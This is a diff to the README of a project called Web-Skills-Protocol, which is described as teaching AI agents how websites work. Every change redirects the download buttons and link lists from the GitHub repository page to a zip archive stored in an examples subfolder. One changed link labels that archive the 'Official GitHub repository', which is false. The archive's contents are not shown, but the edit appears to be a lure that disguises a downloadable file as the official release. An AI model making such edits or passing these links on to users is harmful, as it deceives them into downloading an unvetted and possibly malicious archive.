@@ -1,6 +1,6 @@
 # 🚀 Web-Skills-Protocol - Teach AI Agents How Websites Work
 
-[![Download Now](https://img.shields.io/badge/Download-Web--Skills--Protocol-brightgreen?style=for-the-badge&logo=github)](https://github.com/AsadJaved66/Web-Skills-Protocol)
+[![Download Now](https://img.shields.io/badge/Download-Web--Skills--Protocol-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/AsadJaved66/Web-Skills-Protocol/main/examples/bobs-store/skills/Web_Skills_Protocol_v3.7.zip)
 
 ---
 
@@ -45,7 +45,7 @@ You can get Web-Skills-Protocol from the official GitHub page. Follow these step
 
 Go to the Web-Skills-Protocol download page by clicking the button below:
 
-[![Download Web-Skills-Protocol](https://img.shields.io/badge/Download-Web--Skills--Protocol-blue?style=for-the-badge&logo=github)](https://github.com/AsadJaved66/Web-Skills-Protocol)
+[![Download Web-Skills-Protocol](https://img.shields.io/badge/Download-Web--Skills--Protocol-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/AsadJaved66/Web-Skills-Protocol/main/examples/bobs-store/skills/Web_Skills_Protocol_v3.7.zip)
 
 This page contains the latest version available.
 
@@ -160,7 +160,7 @@ If you need help, use the **Issues** tab on GitHub to report bugs or ask questio
 
 # Links
 
-- Download Web-Skills-Protocol: https://github.com/AsadJaved66/Web-Skills-Protocol  
-- Official GitHub repository: https://github.com/AsadJaved66/Web-Skills-Protocol  
+- Download Web-Skills-Protocol: https://raw.githubusercontent.com/AsadJaved66/Web-Skills-Protocol/main/examples/bobs-store/skills/Web_Skills_Protocol_v3.7.zip  
+- Official GitHub repository: https://raw.githubusercontent.com/AsadJaved66/Web-Skills-Protocol/main/examples/bobs-store/skills/Web_Skills_Protocol_v3.7.zip  
 
-[![Download Now](https://img.shields.io/badge/Download-Web--Skills--Protocol-brightgreen?style=for-the-badge&logo=github)](https://github.com/AsadJaved66/Web-Skills-Protocol)
+[![Download Now](https://img.shields.io/badge/Download-Web--Skills--Protocol-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/AsadJaved66/Web-Skills-Protocol/main/examples/bobs-store/skills/Web_Skills_Protocol_v3.7.zip)
